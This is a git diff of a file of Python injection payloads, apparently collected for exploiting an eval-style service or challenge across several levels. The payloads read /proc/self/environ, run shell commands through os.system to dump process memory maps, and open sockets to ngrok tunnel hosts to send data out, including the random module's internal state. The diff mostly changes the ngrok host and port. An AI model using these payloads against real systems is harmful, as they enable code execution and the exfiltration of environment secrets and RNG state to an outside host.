@@ -1,3 +1,5 @@
+## Just some not-so-organized payloads here
+
 # Level 0
 
 open('/proc/self/environ').read()
@@ -39,11 +41,11 @@ __import__("os").system(f'cat /proc/{__import__("os").getpid()}/maps')
 
 ## Socket
 # [[x.connect(('4.tcp.ngrok.io', 17297)), x.recv(9)] for x in [__import__('socket').socket()]]
-[[x.connect(('8.tcp.ngrok.io', 13584)), x.send(b'a'*100), x.close()] for x in [__import__('socket').socket()]]
+[[x.connect(('0.tcp.ngrok.io', 12851)), x.send(b'a'*100), x.close()] for x in [__import__('socket').socket()]]
 
 __import__("sys").version_info
 
-[[x.connect(('2.tcp.ngrok.io', 19801)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]]
+[[x.connect(('0.tcp.ngrok.io', 12851)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]]
 
 int([[x.connect(('2.tcp.ngrok.io', 19801)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]][0][2])
 
